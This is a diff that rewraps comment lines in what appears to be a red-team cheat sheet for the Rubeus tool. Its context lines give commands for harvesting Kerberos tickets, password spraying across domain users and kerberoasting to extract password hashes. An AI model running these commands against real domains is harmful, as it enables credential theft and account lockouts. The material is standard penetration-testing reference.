@@ -7,9 +7,9 @@ NOTE: To use Rebueus you need to already be on the domain you are attacking, or 
 ## Harvest Kerberos Tickets
 
 ```powershell
-# Harvest ticket granting tickets observed by the current
-# machine. Probably works best when run on a domain
-# controller.
+# Harvest ticket granting tickets observed by the
+# current machine. Probably works best when run on a
+# domain controller.
 #
 Rubeus.exe harvest /interval:30
 ```
@@ -17,8 +17,8 @@ Rubeus.exe harvest /interval:30
 ## Password Spraying
 
 ```powershell
-# Spray the specified password across all known users and
-# generate a ticket giving ticket for successful
+# Spray the specified password across all known users
+# and generate a ticket giving ticket for successful
 # authentications. (Can trigger account lockouts!)
 #
 Rubeus.exe brute /password:ThePasswordToSpray /noticket
@@ -27,8 +27,8 @@ Rubeus.exe brute /password:ThePasswordToSpray /noticket
 ## Kerberoasting
 
 ```powershell
-# Extract password hashes for all known kerberoastable
-# accounts using Rubeus.
+# Extract password hashes for all known
+# kerberoastable accounts using Rubeus.
 #
 Rubeus.exe kerberoast
 ```
